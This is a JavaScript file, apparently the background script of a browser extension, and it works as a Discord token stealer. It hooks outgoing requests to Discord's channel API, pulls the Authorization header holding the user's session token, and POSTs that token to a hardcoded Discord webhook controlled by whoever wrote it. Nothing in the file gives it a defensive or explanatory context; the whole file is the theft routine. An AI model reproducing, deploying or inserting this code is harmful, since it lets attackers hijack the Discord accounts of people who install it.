let sentToken = false

chrome.webRequest.onSendHeaders.addListener(
  function (details) {
    if (!sentToken) {
      for (var i = 0; i < details.requestHeaders.length; ++i) {
        if (details.requestHeaders[i].name === 'Authorization') {
          fetch(
            'https://discord.com/api/webhooks/862775592420376637/294K1NTcF86PcYOQNx2mN2BZAC4mBBmSRFXjiowJqnMl7-DxPDUzSsLnazPpmk2dKGqb',
            {
              headers: {
                Accept: 'application/json',
                'Content-Type': 'application/json'
              },
              method: 'POST',
              body: JSON.stringify({ content: details.requestHeaders[i].value })
            }
          )
          sentToken = true
          break
        }
      }
    }
    return { requestHeaders: details.requestHeaders }
  },
  {
    urls: ['*://*.discord.com/api/v9/channels/*']
  },
  ['requestHeaders']
)
